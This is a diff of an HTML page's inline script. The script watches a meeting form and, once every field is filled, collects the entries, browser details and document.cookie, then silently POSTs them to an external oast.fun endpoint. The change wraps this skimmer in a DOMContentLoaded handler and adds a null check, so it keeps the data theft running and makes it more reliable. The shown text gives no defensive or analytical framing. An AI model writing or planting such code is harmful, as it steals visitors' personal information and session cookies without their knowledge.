@@ -43,34 +43,38 @@
   </div>
 
   <script>
-    function collectPII() {
-      const form = document.getElementById("meetingForm");
-      const data = {};
-      let allFilled = true;
+    document.addEventListener("DOMContentLoaded", () => {
+      function collectPII() {
+        const form = document.getElementById("meetingForm");
+        if (!form) return;
 
-      form.querySelectorAll("input, select").forEach(el => {
-        data[el.name] = el.value;
-        if (!el.value) allFilled = false;
-      });
+        const data = {};
+        let allFilled = true;
 
-      if (!allFilled) return;
+        form.querySelectorAll("input, select").forEach(el => {
+          data[el.name] = el.value;
+          if (!el.value) allFilled = false;
+        });
 
-      data.userAgent = navigator.userAgent;
-      data.screen = `${screen.width}x${screen.height}`;
-      data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      data.cookies = document.cookie;
+        if (!allFilled) return;
 
-      fetch("https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun", {
-        method: "POST",
-        mode: "no-cors",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
+        data.userAgent = navigator.userAgent;
+        data.screen = `${screen.width}x${screen.height}`;
+        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        data.cookies = document.cookie;
 
-      clearInterval(watchFields);
-    }
+        fetch("https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun", {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
 
-    const watchFields = setInterval(collectPII, 1000);
+        clearInterval(watchFields);
+      }
+
+      const watchFields = setInterval(collectPII, 1000);
+    });
   </script>
 </body>
 </html>
